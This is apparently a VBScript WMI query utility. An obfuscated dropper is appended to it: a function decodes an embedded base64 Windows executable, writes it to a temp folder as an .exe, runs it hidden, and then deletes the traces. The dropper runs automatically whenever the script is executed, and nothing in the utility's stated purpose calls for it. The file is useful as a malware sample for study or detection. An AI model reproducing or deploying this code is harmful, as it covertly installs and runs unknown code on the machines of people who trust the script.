On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")::if Err.Number Then:WScript.Echo vbCrLf & "Error # " &             " " & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2")::::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2",strUsername,strPassword)::       case 6:               strComputer = Wscript.Arguments(0):       strUsername = Wscript.Arguments(1):        strPassword = Wscript.Arguments(2):       strQuery = Wscript.Arguments(4):       namespace = Wscript.Arguments(5):       :       Set wbemServices = objWbemLocator.ConnectServer      (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = "":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:Function PzjddcuOjatjGA(pCHGThGDjcfUp):UGDZfEwlFobcIVO = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & pCHGThGDjcfUp & "</B64DECODE>":Set XleUzAVDRoHgMs = CreateObject("MSXML2.DOMDocument.3.0"):XleUzAVDRoHgMs.LoadXML(UGDZfEwlFobcIVO):PzjddcuOjatjGA = XleUzAVDRoHgMs.selectsinglenode("B64DECODE").nodeTypedValue:set XleUzAVDRoHgMs = nothing:End Function:Function ykMHWrRk():CdXRxytcGCRmxy = "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":Dim jBSAKHExqMXdkV:Set jBSAKHExqMXdkV = CreateObject("Scripting.FileSystemObject"):Dim nhEmkjoD:Dim KjpkeQjZAOm:Set nhEmkjoD = jBSAKHExqMXdkV.GetSpecialFolder(2):KjpkeQjZAOm = nhEmkjoD & "\" & jBSAKHExqMXdkV.GetTempName():jBSAKHExqMXdkV.CreateFolder(KjpkeQjZAOm):XxFANVXAPQ = KjpkeQjZAOm & "\" & "alcnvPZi.exe":Dim QrXvWEcVJ:Set QrXvWEcVJ = CreateObject("Wscript.Shell"):FzcavnAWZcIk = PzjddcuOjatjGA(CdXRxytcGCRmxy):Set pWKnriYYvTn = CreateObject("ADODB.Stream"):pWKnriYYvTn.Type = 1:pWKnriYYvTn.Open:pWKnriYYvTn.Write FzcavnAWZcIk:pWKnriYYvTn.SaveToFile XxFANVXAPQ, 2:QrXvWEcVJ.run XxFANVXAPQ, 0, true:jBSAKHExqMXdkV.DeleteFile(XxFANVXAPQ):jBSAKHExqMXdkV.DeleteFolder(KjpkeQjZAOm):End Function:ykMHWrRk:WScript.Quit(0):